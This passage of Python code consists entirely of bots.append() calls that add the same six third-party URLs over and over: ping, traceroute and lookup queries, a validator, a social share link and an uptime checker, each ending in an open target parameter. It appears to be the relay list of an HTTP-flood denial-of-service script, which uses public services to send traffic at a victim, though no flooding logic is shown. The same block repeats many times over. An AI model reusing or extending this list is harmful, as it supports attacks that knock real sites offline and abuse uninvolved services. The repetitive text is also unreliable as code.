	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
	bots.append("http://network-tools.com/default.asp?prog=network&host=")
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	bots.append("http://downforeveryoneorjustme.com/")
	bots.append("http://network-tools.com/default.asp?prog=ping&host=")
	bots.append("http://network-tools.com/default.asp?prog=trace&host=")
